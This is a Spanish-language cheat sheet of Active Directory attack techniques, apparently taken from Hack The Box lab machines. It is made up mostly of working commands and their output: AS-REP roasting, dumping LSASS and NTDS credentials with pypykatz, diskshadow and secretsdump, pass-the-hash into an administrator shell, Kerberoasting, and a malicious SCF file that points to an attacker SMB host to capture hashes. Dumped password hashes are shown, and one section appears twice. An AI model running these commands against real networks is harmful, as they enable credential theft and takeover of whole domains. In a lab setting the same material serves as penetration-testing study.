# Metodología

## ASPRepRoast Attack
```null
GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192
```

## Decrypt LSASS
```null
pypykatz lsa minidump lsass.DMP

INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
[...]
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
[...]
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
```

## Dumpear NTDS

### Backup del System
```null
reg save HKLM\SYSTEM system.bak
```

### Backup del NTDS

#### Creación de unidad lógica temporal

**Fichero.txt**
```null
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:
```

#### Procesación con DiskShadow
```null
diskshadow /s fichero.txt
```

#### Copia de RoboCopy
```null
robocopy /b z:\windows\ntds . ntds.bak
```

#### Dumpeo hashes NT,LM
```null
impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

### PassTheHash

```null
wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator

C:\>
```

### Kerberoasting Attack

```null
GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -request
```

## SCF Malicioso

```null
[Shell]
Command=2
IconFile=\\10.10.16.6\shared\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

## Microsoft Active Directory Certificate Services

### Generar certificados

```null
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
```

## Tráfico de Red

### Obtener clave SSL para importar en WireShark

```null
hflaccus@carpediem:/$ find \-name \*key 2>/dev/null | grep backdrop
./etc/ssl/certs/backdrop.carpediem.htb.key
```

```null
hflaccus@carpediem:/etc/ssl/certs$ ls | grep backdrop
backdrop.carpediem.htb.crt
backdrop.carpediem.htb.key
```

## Desencriptar LSASS

```null
pypykatz lsa minidump lsass.DMP

INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
[...]
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
[...]
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
```